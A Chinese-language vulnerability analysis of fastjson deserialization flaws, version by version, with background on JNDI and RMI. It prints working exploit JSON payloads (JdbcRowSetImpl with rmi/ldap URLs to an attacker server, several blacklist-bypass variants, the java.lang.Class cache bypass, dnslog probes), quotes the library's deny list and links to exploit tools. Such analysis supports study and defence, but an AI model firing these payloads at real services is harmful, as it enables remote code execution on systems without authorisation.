---
category: 网络安全
tag: 漏洞分析
---

# fastjson漏洞分析及复现

FastJson 是一个由阿里巴巴研发的java库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。

fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。

fastjson 源码地址：https://github.com/alibaba/fastjson

fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN

## 1. fastjson反序列化方式简介

fastjson**序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象**。

fastjson有两种常见的处理JSON的方法：

- `JSON.toJSONString()`方法：可将对象转换成`JSON`字符串
- `JSON.parseObject()`方法：将`JSON`字符串转换成对象。

maven引入

```xml
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>xxx</version>
        </dependency>
```

User类：

```java

public class User {
    private String username;
    private int age;

    public void setUsername(String username) {
        this.username = username;
        System.out.println("call setUsername");
    }

    public String getUsername() {
        return username;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("call setAge");
    }

    public int getAge() {
        return age;
    }
}
```

进行序列化及反序列化：

```java
/**
 * @author :xmsong
 * @date : 2023/5/28 9:53
 */
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class parseObjectTest {
    public static void main( String[] args ){
//序列化
        System.out.println("---序列化---");
        User user1 = new User();
        user1.setAge(66);
        user1.setUsername("test");
        String json1 = JSON.toJSONString(user1);
        System.out.println(json1);
//反序列化
        String json2 = "{\"age\":66,\"username\":\"test\"}";

        System.out.println("---指定.class 反序列化---");
        User user2_1 = JSON.parseObject(json2, User.class); // 后面的User.class表示反序列化为User类
        System.out.println(user2_1);

        System.out.println("---不指定类 反序列化---");
        JSONObject user2_2 = JSON.parseObject(json2);
        System.out.println(user2_2);

        System.out.println("---指定@type 反序列化---");
        String json3 = "{\"@type\":\"User\", \"age\":66,\"username\":\"test\"}";
        JSONObject user3 = JSON.parseObject(json3);
        System.out.println(user3);
    }

}


// 反序列化
// 这里我们反序列化使用的是parseObject()方法，其实也可以用到parse()方法，parseObject() 本质上也是调用 parse() 进行反序列化的。
// 但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()；
```

例如前面代码运行结果为：

![image-20230528174741610](img/image-20230528174741610.png)

>  `@type`是`fastjson`中的一个特殊注解，用于标识`JSON`字符串中的某个属性是一个`Java`对象的类型。具体来说，当`fastjson`从`JSON`字符串反序列化为`Java`对象时，如果`JSON`字符串中包含`@type`属性，`fastjson`会根据该属性的值来确定反序列化后的`Java`对象的类型。

Java实现Excel导入和导出  https://blog.csdn.net/bbj12345678/article/details/131370637

## 2. 反序列化漏洞基础

上面例子可以看出，fastjson反序列化时，支持使用@type字段来指定反序列化的类型，并调用该类的set/get方法来访问属性，当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，即可构造出一些恶意利用链。但需注意JNDI注入有JDK版本限制，高版本需要进行绕过。

### （1）漏洞利用前提

1. 用户能控制反序列化的类；
2. 反序列化时类中的方法会被执行。

对比上面三种方式可知，当指定目标类时，`JSON.parseObject()`会识别并调用指定的目标类的 `setter `方法及某些特定条件的 `getter `方法，而直接使用该方法返回的是`JSONObject`对象，是不会触发`setXXX`方法的（因为JVM也不知道是哪个类的对象）。

### （2）反序列化实现RCE

想要在反序列化的时候调用对应方法有两种方式：

1. 在要反序列化的JSON字符串中没有`@types`时，需要将第二个参数设置为指定类，例如`User.class`，此时会返回一个User类对象。**在parseObject()方法中传入类的方法，已经把反序列化的类固定了，没法通过用户来控制**
2. 通过@type字段来指定该JSON应当还原成何种类型的对象，此时返回`JSONObject`。**使用@type参数的方式进行反序列化，攻击者可以构造带有@type参数的JSON发送给服务器。**在这个JSON反序列化接口处，我们传入恶意的JSON，就可以调用任意类的构造方法以及属性相关的get，set方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意JSON达到RCE的作用。

### （3）JNDI注入

**JNDI(Java Naming and Directory Interface)**是一个应用程序设计的API，为开发人员提供了**查找和访问各种命名和目录服务**的通用、统一的接口（类似JDBC都是构建在抽象层上）。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。

**命名服务：**将Java对象以某个名称的形式**绑定（binding）**到一个容器环境（Context）中，以后调用容器环境（Context）的**查找（lookup）**方法又可以查找出某个名称所绑定的Java对象。简单来说，就是把一个Java对象和一个特定的名称关联在一起，方便容器后续使用。

**目录服务：**将一个对象的所有属性信息保存到一个容器环境中。JNDI的目录（Directory）原理与JNDI的命名（Naming）原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身。举个例子，Name的作用是在容器环境中绑定一个Person对象，而Directory的作用是在容器环境中保存这个Person对象的属性，比如说age=10，name=小明等等。实际上，二者往往是结合在一起使用的。

`JNDI`默认支持自动转换的协议：

| 协议名称             | 协议URL        | Context类                                               |
| -------------------- | -------------- | ------------------------------------------------------- |
| DNS协议              | `dns://`       | `com.sun.jndi.url.dns.dnsURLContext`                    |
| RMI协议              | `rmi://`       | `com.sun.jndi.url.rmi.rmiURLContext`                    |
| LDAP协议             | `ldap://`      | `com.sun.jndi.url.ldap.ldapURLContext`                  |
| LDAP协议             | `ldaps://`     | `com.sun.jndi.url.ldaps.ldapsURLContextFactory`         |
| IIOP对象请求代理协议 | `iiop://`      | `com.sun.jndi.url.iiop.iiopURLContext`                  |
| IIOP对象请求代理协议 | `iiopname://`  | `com.sun.jndi.url.iiopname.iiopnameURLContextFactory`   |
| IIOP对象请求代理协议 | `corbaname://` | `com.sun.jndi.url.corbaname.corbanameURLContextFactory` |



------

**RMI（Remote Method Invocation）**是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地需根据接口类的定义，提供相应的参数即可调用远程方法。

RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。**RMI服务端将URL传递给客户端，客户端通过HTTP/HTTPS请求下载这些类。**

![v2-4d7997d41a1a1b86b9199698750d664f_720w](img/v2-4d7997d41a1a1b86b9199698750d664f_720w.webp)

------

**JNDI 注入**，即当开发者在定义 `JNDI` 接口初始化时，`lookup()` 方法的参数可控，攻击者就可以将恶意的 `url` 传入参数远程加载恶意载荷，造成注入攻击。

攻击者先准备一个恶意的命令执行的java类，如下：

![image-20230609092625125](img/image-20230609092625125.png)

攻击者再准备一个RMI服务器，当收到rmi的请求后，就去加载上面的恶意类，将结果返回给客户端，如下：

![image-20230609092501016](img/image-20230609092501016.png)

假设有一个客户端，使用了如下的lookup()函数，并且参数可控，只要被攻击主机发出如下的rmi请求，就会加载一个远程的恶意对象，使得攻击成功。

![image-20230609092537974](img/image-20230609092537974.png)

**JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191。（更高版本也有绕过）**

## 3. 漏洞分析

### 指纹判断

 无特殊配置情况下fastjson，无正确的闭合会报错，返回结果里有fastjson字样。

![image-20230703151327234](img/image-20230703151327234.png)

![image-20230703162124405](img/image-20230703162124405.png)

![image-20230703162343567](img/image-20230703162343567.png)

如果是配置了不返回报错信息怎么办？那这种情况就只有利用dnslog盲打了。

![image-20230703151711466](img/image-20230703151711466.png)



![image-20230703151809119](img/image-20230703151809119.png)

**盲打payload**(dnslog处填写生成的域名)

```json
// 1.2.67版本前
{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
// 1.2.67版本后
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}} 
```



### fastjson<=1.2.24

`com.sun.rowset.JdbcRowSetImpl`这个类可以被利用这个类中有很多的`setXXX`方法，我们需要利用的是`setDataSourceName()`和`setAutoCommit()`这两个方法，通过JNDI注入来实现RCE。

payload一般长这样：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ip:port/Exploit","autoCommit":true}
或者
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:port/Exploit","autoCommit":true}
```

攻击时只需要将如下内容发送给fastjson:

![image-20230609101653093](img/image-20230609101653093.png)

payload发送给服务端后会执行setAutoCommit()，setAutoCommit()执行了connct()函数，

![image-20230609101243387](img/image-20230609101243387.png)

connect()会对dataSourceName属性进行一个**InitialContext.lookup()**，从而实现JNDI注入。

![image-20230608131335095](img/image-20230608131335095.png)

---

### 1.2.25<=fastjson<=1.2.41

fastjson于在1.2.25开始加入了黑白名单机制，继续用1.2.24的payload（这里用TemplatesImpl的payload）去打，会发现报错autotype不支持

![image-20230608173650227](img/image-20230608173650227.png)

究其原因，是因为在com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法，传进来的@type的值要进入一个checkAutoType()方法的判断：

```java
com.alibaba.fastjson.parser.ParserConfig类中：

public Class<?> checkAutoType(String typeName, Class<?> expectClass)
```

**在其中有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类**

![image-20230619160428015](img/image-20230619160428015.png)

黑名单长这样:

```java
this.denyList = "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
```

![image-20230619162916883](img/image-20230619162916883.png)

**若autotypesupport开启，则会先白名单加载，后黑名单检测**

![image-20230619160718725](img/image-20230619160718725.png)

此处的loadclass方法如下：**若类名以L开头；结尾，则会把这两个字符去掉并加载类**。

> 至于为什么会有这种奇怪的处理，`L `和` ; `这一对字符其实是 JVM 字节码中用来表示类名的

![image-20230619161609186](img/image-20230619161609186.png)

**绕过方式**：所以在autotypesupport开启时，我们可以构造如下payload来bypass

```javascript
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://ip:1099","autoCommit":true}
```

如何开启autotypesupport？只需在json被解析前加入如下代码即可

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

![image-20230619162339270](img/image-20230619162339270.png)

就可以在绕过黑名单检测；

![image-20230619163158122](img/image-20230619163158122.png)

在loadclass方法中去掉多余的字符，从而调用正确的类`JdbcRowSetImpl`。

![image-20230619163319115](img/image-20230619163319115.png)

---



### fastjson=1.2.42

42版本中开发人员将明文黑名单改成了hash黑名单，已经有人碰撞出了不少；https://github.com/LeadroyaL/fastjson-blacklist

在处理前一种黑名单绕过的时候做了一个校验，如果**类名**以`L`开头，`;`结尾，则会用stubstring去掉(这个判断是由HASH来判断的）但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组L和;，：

```javascript
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    className = className.substring(1, className.length() - 1);
}
```

**bypass（双写绕过）**

**前提：需要开启autotype**

```javascript
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"ldap://127.0.0.1:2357/Command8",
    "autoCommit":true
}
```





### fastjson=1.2.43

针对双写绕过套了个子判断。

```javascript
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                    throw new JSONException("autoType is not support. " + typeName);
                }

                className = className.substring(1, className.length() - 1);
            }
```

TypeUtils.loadClass 中除了对`L;`进行判断，还有对`[`进行了判断

```javascript
} else if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
} 
```

![image-20230619180428246](img/image-20230619180428246.png)



**Bypass**

**前提：需要开启autotype**

构造如下payload，具体为啥这么构造没有细跟，反正跟`[`有关

```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl”[{,"dataSourceName":"ldap://localhost:9999/a","autoCommit":true}"
```

首先是`[com.sun.rowset.JdbcRowSetImpl`，通过这个方式可以过checkAutotype检测。

其次是`[{,"dataSourceName`，这里的`[{`主要目的是通过fastjson的自动检测，实际上就是对token进行控制，这里如果是`[`的话就会让token变为14从而通过之后的检测。

https://blog.csdn.net/qq_36869808/article/details/123201615



### fastjson<=1.2.47

44版本针对43版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常

**Bypass**

**前提：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；**

攻击json如下：

```json
{
    "a": {                              
        "@type": "java.lang.Class",           //放入内存
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",   //触发payload弹计算器
        "dataSourceName": "rmi://ip/exp",  
        "autoCommit": true
    }
}
```



在DefaultJSONParser类中。传进来的@type的值要进入一个checkAutoType()方法的判断：

![image-20230609105231200](img/image-20230609105231200.png)

能够看出来这个方法中，会先做一个黑白名单的判断，

![image-20230609105736726](img/image-20230609105736726.png)

在调用解析时我们没有传入预期的反序列化对象的对应类名时，会从mapping中或者deserializers.findClass()寻找，当找到类之后会直接return class，不会再进行autotype和黑名单校验，而在deserializers中有`java.lang.Class`

先在mapping里找java.lang.class，找不到

![image-20230609142233848](img/image-20230609142233848.png)



去deserializers找，能找到

![image-20230609142504773](img/image-20230609142504773.png)

进入checkAutoType，校验通过

![image-20230609142713545](img/image-20230609142713545.png)



![image-20230609142013160](img/image-20230609142013160.png)

在校验autotype和黑名单之前就已经return了clazz，变相绕过了黑名单，利用JNDI注入实现RCE。

### 各版本攻击方式汇总

https://github.com/safe6Sec/Fastjson





## 4. 工具使用

### JNDI注入工具

下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/tree/master，

https://github.com/wyzxxz/jndi_tool

类似的工具很多，github搜索JNDI即可。



起rmi或ldap服务，命令如下：

![image-20230529100551944](img/image-20230529100551944.png)



**ldap:**

![image-20230529100957138](img/image-20230529100957138.png)



### fastjson攻击工具

https://github.com/a1phaboy/FastjsonScan

https://github.com/mrknow001/fastjson_rec_exploit  完全基于dnslog，适合能访问外网的靶机

防御

https://github.com/YoungBear/FastjsonPoc